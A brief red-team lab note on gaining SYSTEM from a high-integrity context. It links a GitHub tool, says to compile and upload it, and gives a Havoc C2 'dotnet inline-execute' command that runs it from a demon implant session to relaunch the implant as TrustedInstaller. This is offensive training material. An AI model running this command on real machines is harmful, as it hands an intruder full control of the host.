# Lab - GetSystem

A very simple lab stat shows you another way of getting SYSTEM when running in a high integrity context.

<https://github.com/rara64/GetTrustedInstaller>

Compile the code and upload with updog2 to kali /opt/Havoc/assemblies

From your demon session in Havoc C2 Client
```bash
dotnet inline-execute /opt/Havoc/assemblies/GetTrustedInstaller.exe "c:\temp\demon.x64.exe"
```
![image](./images/lab_getsystem_trusted.jpg)
![image](./images/lab_getsystem_si.jpg)